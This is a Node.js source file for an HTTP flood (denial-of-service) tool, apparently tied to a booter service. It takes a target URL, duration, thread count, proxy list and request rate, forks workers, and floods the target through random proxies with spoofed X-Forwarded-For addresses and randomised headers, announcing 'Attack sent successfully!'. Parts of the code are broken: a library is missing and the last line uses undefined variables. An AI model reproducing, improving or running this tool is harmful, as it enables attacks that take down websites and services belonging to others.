const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const net = require('net');
const request = require('request');
const cluster = require('cluster');
const randstr = require('randomstring');
const UserAgent = require('user-agents');
const async = require('async');
const accept_header = ['text/html'];

const lang_header = [
  'en-US',
  'en;q=0.9',
  'es-MX;q=0.8',
  'es;q=0.7'
];

const encoding_header = ['gzip', 'deflate', 'br', 'compress', 'identity', 'zstd'];

const randomMaxAge = [
  'max-age=0',
  'no-cache',
];

const ignoreNames = [
  'RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError',
  'ParseError', 'ParserError', 'TimeoutError', 'JSONError',
  'URLError', 'InvalidURL', 'ProxyError', 'ConnectionError',
  'SSLError', 'RetryError'
];

const ignoreCodes = [
  'SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION',
  'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT',
];

const cplist = [ 
  "ECDHE-RSA-AES256-SHA256",
  "ECDHE-RSA-AES128-SHA256",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES128-GCM-SHA256",
  "DHE-RSA-AES256-SHA256",
  "DHE-RSA-AES128-SHA256",
  "AES256-GCM-SHA384",
  "AES128-GCM-SHA256",
  "TLS_AES_128_GCM_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_AES_128_CCM_8_SHA256",
  "ECDHE-RSA-CHACHA20-POLY1305-SHA256",
  "ECDHE-ECDSA-AES256-SHA384",
  "ECDHE-RSA-AES256-SHA384",
  "ECDHE-ECDSA-AES256-SHA",
  "ECDHE-RSA-AES256-SHA",
  "DHE-RSA-AES256-SHA",
  "ECDHE-ECDSA-AES128-SHA256",
  "ECDHE-RSA-AES128-SHA256",
  "ECDHE-ECDSA-AES128-SHA",
  "ECDHE-RSA-AES128-SHA",
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-AES128-GCM-SHA256"
];

const reusableHeaders = {
  accept: accept_header[Math.floor(Math.random() * accept_header.length)],
  lang: lang_header[Math.floor(Math.random() * lang_header.length)],
  encoding: encoding_header[Math.floor(Math.random() * encoding_header.length)],
  cipher: cplist[Math.floor(Math.random() * cplist.length)]
};

console.log(reusableHeaders.accept); 
console.log(reusableHeaders.lang);   
console.log(reusableHeaders.encoding); 
console.log(reusableHeaders.cipher); 

function spoof() {
  const charset1 = "12";
  const charset2 = "012345";
  const s1 = randstr.generate({ length: 1, charset: charset1 });
  const s2 = randstr.generate({ length: 2, charset: charset2 });
  const s3 = randstr.generate({ length: 1, charset: charset1 });
  const s4 = randstr.generate({ length: 3, charset: charset2 });
  return `${s1}${s2[0]}.${s2[1]}${s3}${s4[0]}.${s4[1]}${s4[2]}.${s1}${s2[0]}.${s2[1]}${s3}${s4[0]}.${s4[1]}${s4[2]}`;
}

const languages = [
  'af', 'sq', 'am', 'ar', 'hy', 'az', 'eu', 'be', 'bn', 'bs', 'bg', 'ca', 'ceb', 'ny',
  'zh-CN', 'zh-TW', 'co', 'hr', 'cs', 'da', 'nl', 'eo', 'et', 'tl', 'fi', 'fr', 'fy',
  'gl', 'ka', 'de', 'el', 'gu', 'ht', 'ha', 'haw', 'iw', 'hi', 'hmn', 'hu', 'is', 'ig',
  'id', 'ga', 'it', 'ja', 'jw', 'kn', 'kk', 'km', 'rw', 'ko', 'ku', 'ky', 'lo', 'la',
  'lv', 'lt', 'lb', 'mk', 'mg', 'ms', 'ml', 'mt', 'mi', 'mr', 'mn', 'my', 'ne', 'no',
  'or', 'ps', 'fa', 'pl', 'pt', 'pa', 'ro', 'ru', 'sm', 'gd', 'sr', 'st', 'sn', 'sd',
  'si', 'sk', 'sl', 'so', 'es', 'su', 'sw', 'sv', 'tg', 'ta', 'tt', 'te', 'th', 'tr',
  'tk', 'uk', 'ur', 'ug', 'uz', 'vi', 'cy', 'xh', 'yi', 'yo', 'zu'
];

const refers = fs.readFileSync('refers.txt', 'utf-8').replace(/\r/g, '').split('\n');
const randomIndex = Math.floor(Math.random() * refers.length);
const Ref = refers[randomIndex];

function generateRandomUserAgent() {
  const userAgent = new UserAgent();
  return userAgent.toString();
}

function generateRandomString() {
  const queries = [
    'utm_source=cyberbooter.su',
    'utm_medium=cyberbooter.su',
    'utm_referrer=cyberbooter.su',
    'utm_campaign=cyberbooter.su',
    'utm_content=cyberbooter.su',
    'utm_term=cyberbooter.su',
    'ipp_sign=cyberbooter.su',
    'ipp_key=cyberbooter.su',
    'ipp_uid=cyberbooter.su',
    ];
  const randomIndex = Math.floor(Math.random() * queries.length);
  return queries[randomIndex];
}



function randomIp() {
  const octets = Array.from({ length: 4 }, () => Math.floor(Math.random() * 256));
  return octets.join('.');
}

process.on('uncaughtException', function (e) {
}).on('unhandledRejection', function (e) {
}).on('warning', e => {
}).setMaxListeners(0);


function isPrivate(ip, privateRanges) {
  if (!ip) {
    throw new Error('IP address is required');
  }
  if (!privateRanges || !Array.isArray(privateRanges)) {
    privateRanges = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16'];
  }
  const ipRange = ipaddr.parse(ip);
  for (const range of privateRanges) {
    const cidrRange = ipaddr.parseCIDR(range);
    if (ipRange.match(cidrRange)) {
      return true;
    }
  }
  return false;
}

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];

// Validate input
if (!target || !time || !thread || !proxyFile || !rps) {
    console.error(`Example: node ${process.argv[1]} http://example.com/ 60 10 proxy.txt 100`);
  process.exit(1);
}

// Validate target format
if (!/^https?:\/\//i.test(target)) {
  console.error('Target URL must start with http:// or https://');
  process.exit(1);
}

let proxys;
try {
  const proxyData = fs.readFileSync(proxyFile, 'utf-8');
  proxys = proxyData.trim().split(/\s+/);
} catch (err) {
  console.error('Error reading proxy file:', err.message);
  process.exit(1);
}

// Validate RPS value
if (isNaN(rps) || rps <= 0) {
  console.error('RPS must be a positive number');
  process.exit(1);
}


const proxyr = () => proxys[Math.floor(Math.random() * proxys.length)];


if (cluster.isMaster) {
  const currentDate = new Date();

  console.log(`Attack sent successfully! | Target: ${target} | Duration: ${time} seconds | Threads: ${thread} | Requests per second: ${rps} |`);

  for (let i = 0; i < thread; i++) {
    cluster.fork();
  }

  setTimeout(() => {
    console.log('Attack completed.');
    process.exit(0);
  }, time * 1000);
} else {
  async function sendRequest() {
    return new Promise(async (resolve) => {
      const parsed = url.parse(target);
      const cipper = reusableHeaders.cipher;
      const proxy = proxyr().split(':');
      const randIp = randomIp();

      const header = {
        ":method": "GET",
        ":authority": parsed.host,
        ":path": parsed.path.replace("?", "") + "?" + generateRandomString(),
        ":scheme": "https",
        "X-Forwarded-For": randIp,
        "DNT": "1",
        "accept": reusableHeaders.accept,
        "accept-encoding": reusableHeaders.encoding,
        "accept-language": languages[Math.floor(Math.random() * languages.length)],
        "Referer": Ref,
        "Origin": target,
        "User-Agent": generateRandomUserAgent(),
        "Insecure-Requests": '1',
      };

      const agent = new http.Agent({
        keepAlive: true,
        keepAliveMsecs: 50000,
        maxSockets: Infinity,
      });

      const req = http.request({
        host: proxy[0],
        agent: agent,
        globalAgent: agent,
        port: proxy[1],
        headers: {
          'Host': parsed.host,
          'Connection': 'Keep-Alive',
          'Insecure-Requests': '1',
        },
        method: 'CONNECT',
        path: parsed.host + ':443',
        keepAlive: true,
        keepAliveMsecs: 50000,
      });

      req.on('error', (err) => {
        console.error('Error in request:', err);
      });

      req.end(() => {
        resolve(); // Resolve the promise when the request is complete
      });
    });
  }

  async function flood() {
    const requestPromises = [];

    for (let i = 0; i < rps; i++) {
      requestPromises.push(sendRequest());
    }

    try {
      await Promise.all(requestPromises);
    } catch (error) {
      console.error('Error in sending requests:', error);
    }
  }

  setInterval(() => {
    flood();
  });
}

const client = http2.connect(parsed.href, clientOptions, function() {
});
